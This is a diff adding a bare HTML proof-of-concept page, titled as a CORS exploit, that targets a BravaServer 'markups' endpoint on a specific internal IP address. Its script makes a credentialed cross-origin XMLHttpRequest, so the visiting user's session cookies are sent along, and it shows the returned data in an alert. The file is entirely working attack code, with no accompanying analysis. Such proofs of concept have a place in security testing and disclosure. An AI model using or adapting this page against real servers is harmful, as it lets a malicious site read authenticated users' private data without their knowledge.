@@ -1,0 +1,28 @@
+
+<!DOCTYPE html>
+<html>
+<body>
+<center>
+<h2>C0RS P0C Expl0it</h2>
+<h3>Extract Information</h3>
+ 
+<div id="info">
+<button type="button" onclick="cors()">Exploit</button>
+</div>
+ 
+<script>
+function cors() {
+  var xhttp = new XMLHttpRequest();
+  xhttp.onreadystatechange = function() {
+    if (this.readyState == 4 && this.status == 200) {
+      document.getElementById("info").innerHTML = alert(this.responseText);
+    }
+  };
+  xhttp.open("GET","http://10.96.85.127:8080/BravaServer/markups/78d448cff771539f0d392bc9112392fb93a59a587450132be7358ab57d2d9a54", true);
+  xhttp.withCredentials = true;
+  xhttp.send();
+}
+</script>
+ 
+</body>
+</html>
